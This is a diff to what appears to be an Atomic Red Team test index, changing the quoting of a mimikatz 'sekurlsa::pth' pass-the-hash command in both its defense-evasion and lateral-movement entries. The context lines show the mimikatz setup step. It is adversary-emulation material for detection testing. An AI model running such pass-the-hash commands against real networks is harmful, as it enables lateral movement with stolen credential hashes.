@@ -36045,8 +36045,10 @@ defense-evasion:
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
       executor:
-        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
-          /ntlm:#{ntlm}\n"
+        command: '#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}"
+
+'
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -56261,8 +56263,10 @@ lateral-movement:
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
       executor:
-        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
-          /ntlm:#{ntlm}\n"
+        command: '#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}"
+
+'
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
